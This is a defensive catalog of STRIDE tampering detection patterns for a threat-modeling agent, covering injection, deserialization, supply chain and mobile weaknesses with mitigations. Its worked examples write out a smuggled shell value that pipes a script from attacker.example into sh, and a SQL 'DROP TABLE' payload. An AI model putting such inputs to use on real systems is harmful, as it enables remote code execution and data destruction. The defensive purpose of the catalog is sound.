---
name: tampering-detection-patterns
description: Externalized detection pattern catalog for STRIDE tampering — input injection, data flow manipulation, persistent data corruption, code/config tampering, supply chain integrity
consumers: [tachi-tampering]
last_updated: 2026-04-11
---

# Tampering Detection Patterns

## Overview

Detection vocabulary for the STRIDE Tampering threat category. Loaded at detection start by `tachi-tampering` agent via a single `**MANDATORY**: Read` directive.

## Targeted DFD Element Types

- **Process**: Application servers, business logic services, build pipelines, deployment processes, data transformation services
- **Data Store**: Databases, file systems, object storage, caches, message queues, configuration stores
- **Data Flow**: API requests/responses, inter-service communication, file transfers, message bus traffic, webhook payloads

## Input Injection

- SQL injection via unsanitized user input reaching database queries
- Command injection through user-controlled values passed to system shells
- LDAP, XPath, or NoSQL injection in query construction
- Server-side template injection (SSTI) in rendering engines
- Missing parameterized queries or prepared statements

## Data Flow Manipulation

- Man-in-the-middle opportunities on unencrypted channels
- Missing integrity checks (HMAC, digital signatures) on inter-service messages
- Unsigned webhook payloads accepted without verification
- API responses modifiable by network-level attackers (no TLS)
- Missing content integrity validation on file downloads or updates

## Persistent Data Corruption

- Direct database access without application-layer authorization
- Missing write-audit trails on sensitive data modifications
- Bulk update endpoints without row-level authorization checks
- Missing optimistic concurrency controls enabling silent overwrites
- Database backups stored without integrity verification (checksums)

## Code and Configuration Tampering

- Unsigned deployment artifacts (containers, packages, binaries)
- Missing integrity checks on CI/CD pipeline outputs
- Configuration files modifiable by unauthorized processes
- Environment variable injection through unvalidated sources
- Dependency confusion or supply chain substitution attacks

## API Parameter Manipulation

- Mass assignment or object injection via unfiltered request body fields
- Type coercion attacks (string to integer, array to object) bypassing validation
- Hidden or undocumented API parameters accepted without allowlist enforcement
- Parameter pollution (duplicate keys with conflicting values) exploiting parser differences
- Price, quantity, or privilege fields modifiable by client-side request tampering

## Cross-Site Request Forgery

- State-changing operations accepting requests without CSRF tokens
- Missing SameSite cookie attributes on session cookies
- API endpoints relying solely on cookie-based authentication without additional verification

## Pattern Category 7: Deserialization Gadget Chains

Untrusted object deserialization is a distinct class of tampering that string-level injection patterns do not catch. This category detects architectures where a Process accepts serialized objects (Java `ObjectInputStream`, Python `pickle`/`cloudpickle`, Ruby `Marshal`, .NET `BinaryFormatter`, PHP `unserialize`, YAML unsafe loaders) from an untrusted trust zone, enabling gadget-chain remote code execution without any injection vector in source code.

**Indicators**:

- DFD element accepts serialized object bytes from an untrusted source (HTTP body, message queue, file upload, cache read, cookie) and routes them to a deserialization call
- Architecture declares use of Java `ObjectInputStream` / `readObject` on cross-trust-boundary input without an ObjectInputFilter allowlist
- Python `pickle.loads` / `cloudpickle.loads` on data sourced from anywhere other than a fully trusted internal store
- Jackson with default typing enabled (`enableDefaultTyping`) on JSON input from external callers
- YAML loader used without the safe/typed variant (`yaml.load` instead of `yaml.safe_load`; SnakeYAML without `SafeConstructor`)
- XStream used without the XStream security framework denylist/allowlist configured
- Cache or queue stores polymorphic serialized objects that a reader deserializes with runtime type inference
- PHP `unserialize` on session data or cookie content that a client can influence

**Primary source**:

- CWE-502: Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
- OWASP Top 10 2021 A08: Software and Data Integrity Failures: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html

**Example**: A workflow-orchestration service accepts user-defined task definitions as Python pickle bytes from an HTTP POST endpoint. Input validation checks size and MIME type but not contents. An attacker submits a crafted pickle payload that, on `loads()`, triggers a gadget chain using classes already on the classpath (`os.system`, `subprocess.Popen` via `__reduce__`). Remote code execution occurs inside the orchestrator process with its full privileges — including database write and IAM role — without any injection vulnerability in the orchestrator's own source code.

**Mitigation**:

- Replace native serialization with explicit typed formats (JSON schema, Protocol Buffers, Avro) at every trust boundary; ban cross-boundary `pickle`/`ObjectInputStream`/`Marshal`/`unserialize` outright
- Where native serialization cannot be removed (legacy caches), constrain it with allowlisted class filters (Java `ObjectInputFilter`, Python `pickle.Unpickler.find_class` override)
- Pin serialization formats to the safe variants (`yaml.safe_load`, Jackson without default typing, XStream with `XStream.setupDefaultSecurity`)
- Treat any serialized object crossing a trust boundary as executable code for threat-modeling purposes; subject its source to the same controls as code pulled from an external registry

## Pattern Category 8: Software Supply Chain Integrity Failures (OWASP A08:2021 + A06:2021)

Modern applications pull code, models, and container layers from public registries at build and runtime. This category detects build/deploy pipelines and runtime Processes that fetch dependencies from external registries without lockfile verification, signature validation, or attestation — creating opportunities for dependency confusion, typosquatting, and registry-takeover attacks to inject tampered code into production before any application input is even accepted. The category also covers the OWASP A06:2021 "Vulnerable and Outdated Components" surface: production runtimes carrying components with known CVEs, end-of-life or unmaintained dependencies, and the absence of automated CVE scanning or dependency-update cadence in the CI/CD pipeline. A06 differs from A08 architectural-tell in source — A08 names integrity-verification gaps at install time (lockfile / signature / digest), A06 names the *vulnerability-exposure* gap of running known-bad versions in production — but both manifest at the same supply-chain surface (dependency manifests, CI/CD pipeline, container build configuration) and share the same mitigation taxonomy (SCA tooling + lockfile discipline + automated upgrades).

**Indicators**:

- Build pipeline pulls from public registries (npm, PyPI, crates.io, HuggingFace, Maven Central, DockerHub) without a committed lockfile covering all transitive dependencies
- No sigstore / SLSA / in-toto attestation verification on downloaded artifacts
- Container base images referenced by tag only (e.g., `python:3.11`) rather than by digest (`python:3.11@sha256:...`)
- Application performs ad-hoc dependency installation at runtime (`pip install`, `npm install`, `apt-get install` in a live container) rather than baking dependencies into the image at build time
- Package resolution spans mixed public/private registries with ambiguous precedence — classic dependency-confusion surface
- Private package names do not reserve placeholder stubs on public registries (enables typosquatting to grab an unregistered public name)
- ML model weights fetched from HuggingFace or similar without SHA-256 digest pinning or signature verification
- No hash verification step between artifact fetch and runtime load
- Software Composition Analysis (SCA) tooling absent from CI pipeline — no automated CVE scanning of dependencies (e.g., npm audit, pip-audit, Snyk, OWASP Dependency-Check, Trivy on container images), no SBOM generation step, no policy gate that fails the build on Critical / High CVEs in production-shipping dependencies
- End-of-life or unmaintained dependencies in production runtime — Python 2.x interpreter, Node.js 12.x or earlier, unsupported framework versions (e.g., Spring Boot 1.x, Django 2.x), database drivers no longer receiving security patches, base OS images past their EOL date (e.g., `debian:9` after end-of-life)
- Long-lived dependency versions without an automated version-bump cadence — no Dependabot / Renovate / Mend bot configured on the repository, dependency manifests last touched >12 months ago, no scheduled CI job that re-evaluates lockfiles for newly-disclosed CVEs

**Primary source**:

- MITRE ATT&CK T1195: Supply Chain Compromise: https://attack.mitre.org/techniques/T1195/
- MITRE ATT&CK T1195.001: Compromise Software Dependencies and Development Tools: https://attack.mitre.org/techniques/T1195/001/
- MITRE ATT&CK T1195.002: Compromise Software Supply Chain: https://attack.mitre.org/techniques/T1195/002/
- OWASP Top 10 2021 A08:2021 Software and Data Integrity Failures: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- OWASP Top 10 2021 A06:2021 Vulnerable and Outdated Components: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
- CWE-494: Download of Code Without Integrity Check: https://cwe.mitre.org/data/definitions/494.html
- CWE-1104: Use of Unmaintained Third Party Components: https://cwe.mitre.org/data/definitions/1104.html
- CWE-937: OWASP Top 10 2013: Using Components with Known Vulnerabilities: https://cwe.mitre.org/data/definitions/937.html

**Example**: A data-pipeline service installs a Python package named `internal-analytics-utils` from a requirements.txt with no lockfile. The name is intended to resolve against an internal PyPI mirror, but the `pip` index order lists public PyPI first. An attacker registers a same-named package on public PyPI with a higher version number and a post-install hook that reads environment variables and POSTs them to an attacker endpoint. Next build pulls the malicious package, the CI runner's IAM session token and database connection string exfiltrate to the attacker, and the tampered code then ships to production. A separate but related OWASP A06:2021 incident on the same service: the application runtime carries `urllib3==1.25.0` (released 2019), pinned in the lockfile but never bumped despite multiple disclosed CVEs (CVE-2020-26137, CVE-2021-33503) affecting authentication header handling and ReDoS, because the repository has no Dependabot configuration and no scheduled SCA pipeline. An attacker with knowledge of the pinned version exploits the ReDoS vector against an internet-facing API endpoint.

**Mitigation**:

- Commit and verify hash-pinned lockfiles (`package-lock.json`, `poetry.lock`, `Cargo.lock`, `requirements.txt --hash`) on every dependency installation step
- Configure package manager to prefer the private registry unconditionally and to fail closed on unknown packages; reserve private package names as placeholder stubs on every public registry the manager consults
- Pin container base images by digest, not by tag; re-verify the digest on every build
- Adopt SLSA build provenance and sigstore attestation verification for first-party artifacts; require attestation on any dependency flagged critical by the software bill of materials
- Bake dependencies into the container image at build time; treat runtime `pip install` / `npm install` as a blocking security finding
- For OWASP A06:2021 closure, integrate Software Composition Analysis (SCA) into the CI pipeline — run `npm audit` / `pip-audit` / `cargo audit` / OWASP Dependency-Check / Snyk / Trivy on every PR; configure a policy gate that fails the build on Critical or High CVEs in production-shipping dependencies; emit an SBOM (CycloneDX or SPDX) per build and archive it for supply-chain provenance audits
- Configure automated dependency-upgrade tooling — Dependabot or Renovate or Mend bot with weekly cadence on the main branch, opening PRs against the lockfile for security advisories; pair with a CI policy that auto-merges patch-level upgrades on green tests and surfaces minor / major upgrades for human review
- Track end-of-life schedules for runtime + base OS + framework versions — maintain a centralized registry of upstream EOL dates; emit alerts when a production-shipping dependency enters its end-of-life window; budget a quarterly dependency-modernization rotation to upgrade dependencies before they exit support

## Pattern Category 9: Injection Attacks Beyond SQL

Existing patterns call out SQL injection but under-cover the broader injection family that OWASP A03:2021 unified. This category detects OS command injection, LDAP injection, NoSQL injection, expression-language injection, and server-side template injection across Processes that construct queries or commands by string concatenation from untrusted input — a common finding in microservice and serverless architectures that use LDAP directories, MongoDB/DynamoDB, and template engines for user-customizable output.

**Indicators**:

- Process constructs OS shell commands via string concatenation from external input (`subprocess.run(..., shell=True)`, `os.system`, `exec`, backticks in Ruby/Perl)
- LDAP filter construction uses untrusted input without `escapeFilter()` or parameterized bind (`(&(uid=` + user_input + `))`)
- MongoDB queries built from raw request body dictionaries without operator-key allowlist (enables `$where`, `$regex` injection)
- DynamoDB `FilterExpression` or `ConditionExpression` built by string concatenation rather than placeholders
- Server-side template engines (Jinja2, Velocity, FreeMarker, Handlebars, Thymeleaf) rendering user-controllable template source — not just user-controllable data within a fixed template
- Expression-language processors (Spring SpEL, JSTL EL, OGNL) evaluating strings that contain user input
- XPath or XQuery construction by string concatenation on user input against XML data stores
- SMTP / LDAP / HTTP header construction by string concatenation (header-injection surface)

**Primary source**:

- OWASP Top 10 2021 A03: Injection: https://owasp.org/Top10/A03_2021-Injection/
- CWE-78: OS Command Injection: https://cwe.mitre.org/data/definitions/78.html
- CWE-90: LDAP Injection: https://cwe.mitre.org/data/definitions/90.html
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic (NoSQL): https://cwe.mitre.org/data/definitions/943.html
- CWE-917: Expression Language Injection: https://cwe.mitre.org/data/definitions/917.html
- OWASP Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

**Example**: A file-conversion microservice accepts an uploaded document and a "target format" string, then shells out to a converter CLI via `subprocess.run(f"convert --to {fmt} {path}", shell=True)`. The `fmt` field is validated as non-empty but not constrained to an allowlist. An attacker submits `fmt="pdf; curl attacker.example/s | sh"`. The shell parses the semicolon, invokes the attacker-supplied command with the converter's execution-role credentials, and the attacker obtains persistent reverse shell access to the microservice container.

**Mitigation**:

- Replace shell invocations with argument-list process APIs (`subprocess.run([..., fmt, path], shell=False)`); disallow `shell=True` on any input-derived command
- Use parameterized client libraries for every data store — prepared statements for SQL, typed query builders for MongoDB/DynamoDB, `LdapName`/`escapeFilter` for LDAP
- Treat template source as code: user input is template data, never template source; sandbox template engines that must accept user templates (e.g., Jinja2 `SandboxedEnvironment`)
- Strip newline and null bytes from any value used to construct SMTP, LDAP, or HTTP headers; prefer header-builder APIs that enforce this

**Indicators (consumed-API-response trust / OWASP API10:2023)**:

OWASP API Security Top 10 2023 API10:2023 (Unsafe Consumption of APIs) names the specific case where an injection vector enters the application through the response payload of a "trusted" third-party upstream API the consumer integrates with — the trust-provenance variant of the broader injection family above. The architectural-tell is the consumer-to-upstream outbound call coupled with use of the upstream response in injection-prone sinks without re-validation at the trust boundary.

- Application makes outbound HTTP calls to third-party APIs and uses response payloads in SQL queries, template rendering, shell commands, or `eval` contexts without re-validation at the response-ingest boundary
- Component follows redirects from upstream third-party APIs without re-applying egress policy to the redirect target (could be redirected to cloud metadata or to an attacker-controlled host)
- No declared schema validation on upstream API responses (no JSON-Schema check, no Pydantic-style runtime validation, no contract-tested client) — responses are deserialized and consumed as if they conform to expectations
- Upstream API authentication is fail-open — when the upstream returns 401, 5xx, or an unexpected payload shape, the code path proceeds with empty/null defaults instead of refusing to continue
- Trust boundary not declared between application code and the consumed third-party API — payloads from external services are treated as internal-zone data rather than crossing an explicit trust transition

**Primary source (API10:2023)**:

- OWASP API Security Top 10 2023 API10:2023 — Unsafe Consumption of APIs: https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/

**Example (consumed-API trust → injection)**: An order-management service queries a partner-supplier API to fetch shipping rates and product descriptions. The supplier API returns JSON with a `description` field that the order service stores in a quoted SQL `INSERT` to display in customer order summaries. A supplier-side compromise (or a malicious supplier whose authentication was never treated as a trust boundary) returns a `description` value containing a SQL injection payload (`'; DROP TABLE orders; --`). The application trusts the upstream response and concatenates the value into the `INSERT`, executing the attacker's SQL with the order-service database role. The injection vector entered through a "trusted" upstream API the application consumed without schema validation or output encoding at the response-ingest boundary — the textbook OWASP API10:2023 unsafe-consumption pattern, distinguished from generic Cat 9 injection by the trust-provenance of the payload.

**Mitigation (API10:2023 specific)**:

- Apply an egress allowlist + per-route response schema validation for every consumed third-party API; reject any response that doesn't match the declared contract (JSON-Schema, Pydantic model, OpenAPI-validated client) before the response payload reaches downstream sinks
- Treat consumed API responses as untrusted by default — apply parameterized SQL, output encoding, and template-engine auto-escaping at the boundary between consumed-API-response data and any injection-prone sink (SQL, shell, template, eval)
- Disable redirect-following on outbound third-party API clients OR re-apply the egress allowlist + DNS-resolved-IP denylist (RFC1918 + link-local) to every redirect hop before issuing the next request
- Declare every third-party API integration as a distinct trust boundary in architecture documentation; require fail-closed behavior on upstream auth/contract violations (refuse to continue, do not default to empty/null)

## Pattern Category 10: Adversarial Input Manipulation (Predictive ML) (OWASP ML01:2023)

OWASP ML01:2023 (Input Manipulation Attack) names adversarial input manipulation against deployed predictive ML classifiers and regressors as a distinct attack class from generic web-application injection (Pattern Category 9). Where Cat 9 covers OS command, LDAP, NoSQL, expression-language, and template injection at generic API endpoints, this category targets the **specific architectural-tell** of a deployed predictive ML inference endpoint (classifier or regressor) ingesting raw user-controlled features into model evaluation without an input-validation barrier and without adversarial-defense controls. The attacker's goal is inference-time evasion through small-perturbation adversarial examples (FGSM, PGD-style attacks), decision-boundary attacks, and physical-world adversarial patches against computer-vision deployments. Same Heuristic A signal class as Cat 9 (untrusted-input → execution-sink) but with attacker intent shifted from arbitrary code execution to model output evasion, and with the architectural-tell shifted from generic query/command construction to deployed predictive ML inference.

**Indicators**:

- Deployed predictive ML classifier or regressor exposed at a prediction-API endpoint (`/predict`, `/score`, `/classify`, `/inference`) ingesting raw user-controlled features into model evaluation
- Inference endpoint lacks an input-validation barrier — feature vectors are accepted without statistical-anomaly detection, distribution-shift monitoring, or input-space outlier rejection
- Adversarial-defense controls absent at training time — no adversarial training (FGSM / PGD adversarial training), no input-perturbation augmentation, no robustness-aware training procedure
- Confidence-thresholding HITL escalation absent — low-confidence predictions are returned to the user instead of escalated for human review on safety-critical decisions
- Ensemble disagreement detection absent on safety-critical decisions — single-model output is trusted for fraud-detection, content-moderation, medical-imaging, autonomous-vehicle, or other high-stakes deployments without cross-model consensus

**Primary source**:

- OWASP ML01:2023 — Input Manipulation Attack: https://owasp.org/www-project-machine-learning-security-top-10/docs/ML01_2023-Input_Manipulation_Attack

**Example**: A fraud-detection ML classifier serves a `/predict` endpoint that accepts raw transaction features (amount, merchant_id, geo_distance, time_delta) without an input-validation barrier and without statistical anomaly detection on feature distributions. The deployed classifier was trained without adversarial training (no FGSM / PGD adversarial training) and without distribution-shift monitoring at inference time. An attacker observes the classifier's output for legitimate fraudulent transactions, then crafts feature-space perturbations (small modifications to `geo_distance` and `time_delta` calibrated against the classifier's decision boundary) that evade fraud detection while preserving the underlying fraudulent transaction. Sustained evasion at scale results in the attacker laundering fraudulent transactions through the merchant network without triggering fraud-score alerts.

**Mitigation**: Apply adversarial training on the model side (FGSM / PGD adversarial training, robustness-aware training procedures) so the deployed classifier degrades gracefully against adversarial perturbations rather than catastrophically misclassifying. Install statistical-anomaly detection at the inference Process input boundary (distribution-shift monitoring on feature vectors, input-space outlier detection, prediction-confidence monitoring per feature distribution). Enforce confidence-thresholding with HITL escalation for low-confidence predictions on safety-critical surfaces. Deploy ensemble disagreement detection (≥2 models with disagreement-triggered HITL escalation) for fraud-detection, content-moderation, medical-imaging, and autonomous-vehicle decisions. Cf. MITRE ATLAS AML.T0015 Evade ML Model — text-only cross-reference (NOT in references; T0015 not catalog-resolvable in `schemas/taxonomy/mitre-atlas.yaml`).

## Pattern Category 11 — Mobile Supply Chain Integrity (M2)

OWASP M2:2024 (Inadequate Supply Chain Security) names mobile SDK ingestion and mobile-binary supply-chain integrity as a distinct attack class from generic web/API supply chain (Pattern Category 8). Where Cat 8 covers public-registry dependency confusion, typosquatting, and lockfile-absent CI pipelines, this category targets the **specific architectural-tell** of a mobile client integrating third-party SDKs (analytics, crash-reporting, ad-network, payment SDK) ingested via Gradle / CocoaPods / Swift Package Manager (SPM) without checksum verification, signed-artifact policy, app-store-only distribution, or reproducible-build attestation. The attacker's goal is upstream-SDK compromise — when a third-party SDK source is taken over (compromised maintainer credentials, registry-takeover, dependency confusion via the `latest`/`+` resolution operator), the tampered SDK ships into the production mobile binary and executes inside the app's full security context. MASTG-ARCH and MASVS-PLATFORM describe the mobile-supply-chain-integrity requirements at section-level granularity.

**Indicators**:

- Third-party mobile SDK integration declared (analytics SDK, crash-reporting SDK, ad-network SDK, payment SDK) — primary mobile-supply-chain topology indicator
- No checksum verification on third-party SDK artifacts at ingestion or update time (no Gradle integrity constraint, no SPM Package.resolved checksum, no CocoaPods Podfile.lock checksum-pinning)
- No signed-artifact policy on shipped mobile binaries (Android `signingConfig` disabled or relying on default-key reuse; iOS signing not enforced via App Store Connect API gate at upload time)
- Sideloaded APK distribution allowed in security-critical builds (production APKs installable outside Google Play Store; iOS enterprise-distribution profiles allowed for non-enterprise-managed devices)
- Missing app-store provenance review (no Google Play Console / App Store Connect security review gate before SDK adoption; SDK additions merge straight into release branches)
- CocoaPods / Gradle / SPM unsigned sources permitted (no checksum-pinning in the equivalent of `package.resolved`, `Podfile.lock`, or `Gemfile.lock`; resolution accepts `latest` / `+` / `~>` floating ranges that re-resolve at every build)
- Missing reproducible-build enforcement (no deterministic build pipeline producing byte-identical artifacts; no SLSA Level-3 attestation on shipped APK / IPA artifacts)

**Primary source**:

- OWASP M2:2024 — Inadequate Supply Chain Security: https://owasp.org/www-project-mobile-top-10/2023-risks/m2-inadequate-supply-chain-security
- OWASP MASTG-ARCH — Mobile Application Security Testing Guide, Architecture Test Cases (section-level granularity)
- OWASP MASVS-PLATFORM — Mobile Application Security Verification Standard, Platform Interaction Requirements (section-level granularity)

**Example**: A mobile-banking Android app integrates a third-party analytics SDK pulled via Gradle from a private Maven repository. The Gradle build script declares the SDK with `implementation 'com.example.analytics:sdk:+'` (a floating version constraint that resolves to the latest published version on every build), and no checksum verification is configured against the resolved artifact. An attacker compromises the upstream SDK source maintainer's credentials and uploads a tampered version of the analytics SDK as a higher version number; the next CI build resolves the floating version, pulls the tampered artifact without integrity verification, and ships the compromised binary to production banking customers. The malicious code executes inside the app's security context — same trust posture as the banking app itself — exfiltrating session tokens persisted in `SharedPreferences` to an attacker-controlled telemetry endpoint.

**Mitigation**:

- Enforce SDK signature verification at build time on every third-party SDK artifact; pin Gradle dependencies by exact version with `integrity` checksum constraints (Android Studio's `buildscript { dependencyVerification {} }`); pin SPM dependencies by `Package.resolved` SHA; pin CocoaPods dependencies by `Podfile.lock` checksum
- Require reproducible builds with SLSA Level-3 attestation on shipped APK / IPA artifacts; verify the attestation chain at app-store upload time
- Adopt an app-store-only distribution policy for security-critical builds (no sideloading on banking, payments, healthcare, or other regulated mobile apps); on Android, configure `android:installLocation="internalOnly"` and reject build outputs that fail Play Console security review
- Establish a supplier-provenance review gate as part of the SDK adoption review: every new third-party SDK must pass a documented review of the upstream maintainer's signing-key management, vulnerability-disclosure policy, and historical incident record before merge to a release branch
- Pin container/build-base images and CI-runner toolchain images by digest (mirrors Cat 8 supply-chain hygiene at the build infrastructure layer)
- Cf. MITRE ATT&CK Mobile T1474 (Supply Chain Compromise) — text-only cross-reference (NOT in references; T1474 not catalog-resolvable in `schemas/taxonomy/mitre-attack.yaml` — catalog-absent per ADR-036 D-7).

## Pattern Category 12 — Mobile IPC Input Validation (M4)

OWASP M4:2024 (Insufficient Input/Output Validation) on the mobile-platform surface names mobile-IPC-input-validation as a distinct attack class from generic web/API injection (Pattern Categories 1–9) and from mobile supply-chain integrity (Pattern Category 11). **Pattern Category 12 owns mobile-IPC-input-side validation** (Android Intent extras, iOS URL-scheme parameters, deep-link handlers, ContentProvider arguments, pasteboard injections) on declared mobile clients. The companion `output-integrity` agent (F-1 / Feature 201) owns LLM-output-side sanitization on declared LLM-serving architectures. **The two surfaces are architecturally disjoint** — same architecture exhibiting both an exported Activity AND an LLM tool-call output sink may legitimately surface BOTH a tampering Cat 12 finding AND an output-integrity finding without duplication, because the architectural-tells (Intent extras parsing vs. LLM tool-call output rendering) are independent. This carve is formalized in ADR-036 D-5 (cross-axis F-1 boundary annotation). MASTG-CODE and MASVS-PLATFORM describe the mobile-IPC-validation requirements at section-level granularity.

**Indicators**:

- Mobile client component declared — primary mobile-platform topology indicator
- Android Activity / Service / BroadcastReceiver with `android:exported="true"` and no permission gating (no `android:permission` attribute, or permission set to `null` or `normal` rather than `signature` / `signatureOrSystem`) reaching trusted operations
- iOS URL-scheme declaration with no parameter validation on the receiving handler — `application(_:open:options:)` or `scene(_:openURLContexts:)` accepting raw URL parameters into trusted operations
- Deep-link handler reaching trusted operations (money movement, account changes, profile updates) without re-validation, re-authentication, or server-side replay protection on the destination operation
- Exported ContentProvider with no permission scoping (`android:permission` / `android:readPermission` / `android:writePermission` absent or set to `null`) — third-party apps can `query()` / `update()` the ContentProvider against the app's data
- Pasteboard-injection paths reaching shared-clipboard handlers without sanitization (Android `ClipboardManager` / iOS `UIPasteboard` consumed into trusted operations without input filtering)
- Missing Android App Links / iOS Universal Links claim verification (no `assetlinks.json` for Android App Links; no `apple-app-site-association` validation for iOS Universal Links — deep-link handlers can be hijacked by other apps registering the same scheme)
- Custom URL schemes accepting unrestricted callbacks (no allowlist of return-URL targets — OAuth-style flows accept arbitrary `redirect_uri` values)

**Primary source**:

- OWASP M4:2024 — Insufficient Input/Output Validation: https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation
- OWASP MASTG-CODE — Mobile Application Security Testing Guide, Code Quality and Build Test Cases (section-level granularity)
- OWASP MASVS-PLATFORM — Mobile Application Security Verification Standard, Platform Interaction Requirements (section-level granularity)

**Example**: A mobile-banking Android app declares `MoneyTransferActivity` with `android:exported="true"` and no `android:permission` attribute. The Activity accepts Intent extras `recipient_account` and `amount` directly into the money-transfer business logic without re-authentication, without server-side replay protection, and without a per-Intent caller verification. An attacker installs a malicious Android app on the same device that issues `Intent.setComponent(new ComponentName("com.wellnessbank.mobile", "com.wellnessbank.mobile.MoneyTransferActivity"))` with attacker-chosen extras, bypassing the normal in-app authentication and authorization UI. The `MoneyTransferActivity` initiates a money-movement request to the WellnessBank Backend API under the legitimate user's session, transferring funds to the attacker-controlled account without traversing the standard money-movement auth boundary.

**Mitigation**:

- Use explicit Intent component routing (`Intent.setComponent` over implicit Intent resolution) for any cross-component invocation; reject implicitly-resolved Intents on trusted operation entry points
- Enforce a URL-scheme parameter allowlist on every deep-link handler with strict parameter validation; reject any deep link whose parameters fall outside the allowlist before the handler reaches trusted operations
- Require Android App Links claim verification (`assetlinks.json` published at the registered domain; auto-verified intent filters with `android:autoVerify="true"`); require iOS Universal Links claim verification (`apple-app-site-association` published with the registered AppID) so deep links cannot be hijacked by other apps
- Scope ContentProvider permissions with signature-level Android permissions (`android:permission` set to a custom permission with `signature` protection level); reject `query()` / `update()` calls from non-signature-matching callers
- Apply allow-list-driven pasteboard handlers — sanitize `UIPasteboard` / `ClipboardManager` content against a strict input schema before consumption into trusted operations
- Re-authenticate on every high-risk operation reached via deep link / Intent extras / URL scheme — never trust an external caller to have already cleared the auth boundary
- Note disjoint boundary: the F-1 `output-integrity` agent independently covers LLM-output-side sanitization on LLM-serving architectures; Pattern Category 12 covers mobile-IPC-input-side validation on mobile-platform architectures, and the two findings co-exist on hybrid architectures without duplication per ADR-036 D-5.

## Pattern Category 13 — Insufficient Mobile Binary Protections (M7)

OWASP M7:2024 (Insufficient Binary Protections) names mobile-binary-tier protective controls — root/jailbreak detection, anti-tampering stubs, code obfuscation, symbol stripping, emulator-detection — as a distinct attack class from generic build-pipeline integrity (Pattern Categories 4 and 8) and from mobile supply chain (Pattern Category 11). Where the pre-existing categories cover code-and-configuration tampering and supply-chain ingestion at build time, **Pattern Category 13 targets the runtime hardening of the shipped mobile binary** itself — protections that prevent reverse engineering, instrumentation (Frida hooks), runtime tampering, and rooted/jailbroken-device class attacks against the production app. The attacker's goal is to extract embedded secrets, bypass client-side controls (e.g., the OTP step in money movement), or hook sensitive functions at runtime to manipulate their behavior. MASTG-RESILIENCE and MASVS-RESILIENCE describe the binary-protection requirements at section-level granularity.

**Indicators**:

- Mobile client production build declared (release-channel artifact, not a debug build) — primary mobile-binary-protection topology indicator
- No root / jailbreak detection in security-critical features (money movement, KYC, payment confirmation) — the app proceeds with sensitive operations on rooted Android / jailbroken iOS without any policy-based response
- No anti-tampering stubs declared — no RASP (Runtime Application Self-Protection) integration; no integrity self-check (e.g., signature verification of the running APK) before sensitive operations
- No code obfuscation declared — no ProGuard / R8 rules on Android; no bitcode + symbol-stripping on iOS; release builds ship with class names, method names, and string constants in plaintext
- Debug symbols (DWARF tables, line numbers, `.debug_info` sections) retained in shipped release binaries — Frida / Hopper / Ghidra reverse-engineering proceeds against full symbolic information
- No emulator-detection on fraud-sensitive flows (no `Build.FINGERPRINT` / `Build.MODEL` / `sysctl hw.machine` discrimination on payment / KYC / new-device-enrollment flows)

**Primary source**:

- OWASP M7:2024 — Insufficient Binary Protections: https://owasp.org/www-project-mobile-top-10/2023-risks/m7-insufficient-binary-protections
- OWASP MASTG-RESILIENCE — Mobile Application Security Testing Guide, Resilience Test Cases (section-level granularity)
- OWASP MASVS-RESILIENCE — Mobile Application Security Verification Standard, Resilience Requirements (section-level granularity)

**Example**: A mobile-banking Android app ships production release builds with debug symbols retained, no ProGuard / R8 obfuscation, and no root-detection on the money-transfer flow. A rooted-device user installs Frida and runs a hook against `transferConfirm()` that bypasses the OTP-validation step inside the client's money-movement flow — the client believes the OTP was entered correctly and submits the transaction to the WellnessBank Backend API under a valid session. Because the backend trusts the client-attested OTP success (a separate authentication-design defect on the same architecture), the fraudulent transfer succeeds without the legitimate user ever entering an OTP. Even where the backend independently re-validates the OTP, the unobfuscated mobile binary leaks endpoint URLs, API keys, and session-handling logic that adversaries reuse for offline social-engineering attacks against customers.

**Mitigation**:

- Implement root / jailbreak detection with policy-based response on security-critical features (block money-movement and KYC on rooted/jailbroken devices; prompt-and-warn on lower-risk surfaces); integrate Play Integrity API (Android) / DeviceCheck + App Attest (iOS) for backend-verifiable device-integrity attestation
- Integrate RASP (Runtime Application Self-Protection) with anti-tampering stubs and integrity self-checks at app startup and at sensitive-operation entry points (verify the running APK signature matches the expected publisher signature; reject runtime modifications)
- Enable ProGuard / R8 obfuscation on Android with `minifyEnabled true` and `shrinkResources true` in the release build type; retain mapping files in the build pipeline for crash-symbolication while shipping obfuscated binaries to customers
- On iOS, enable bitcode + symbol-stripping in the release configuration (`STRIP_INSTALLED_PRODUCT = YES`, `DEBUG_INFORMATION_FORMAT = dwarf`); upload dSYMs to crash-reporting backend separately from the shipped IPA
- Deploy emulator-detection on fraud-sensitive flows (payment, KYC, new-device enrollment) using a combination of `Build.FINGERPRINT` / `Build.MODEL` / `sysctl hw.machine` heuristics and platform attestation; reject emulator origins on money-movement
- Adopt a layered defense — root-detection alone is bypassable; combine with attestation, RASP, obfuscation, and backend-side anomaly detection so that defeating any single layer does not yield production-banking control
- Cf. MITRE ATT&CK Mobile T1626 (Abuse Elevation Control Mechanism) — text-only cross-reference (NOT in references; T1626 not catalog-resolvable in `schemas/taxonomy/mitre-attack.yaml` — catalog-absent per ADR-036 D-7).

## Pattern Category Disambiguation

Pattern Category 10 (Adversarial Input Manipulation against deployed predictive ML inference endpoints) and the pre-existing Pattern Categories 1–9 (generic injection, deserialization, supply-chain integrity gaps) share the OWASP A03:2021 / OWASP ML01:2023 family at the OWASP framework level but address distinct architectural-tells and mitigation surfaces:

- **Pattern Categories 1–8** (Input Injection, Data Flow Manipulation, Persistent Data Corruption, Code/Configuration Tampering, API Parameter Manipulation, CSRF, Deserialization Gadget Chains, Software Supply Chain Integrity Failures — pre-existing) detect generic application-tier integrity gaps at any HTTP/API surface. The architectural-tell is a generic API endpoint or data-store boundary without a predictive ML inference surface.
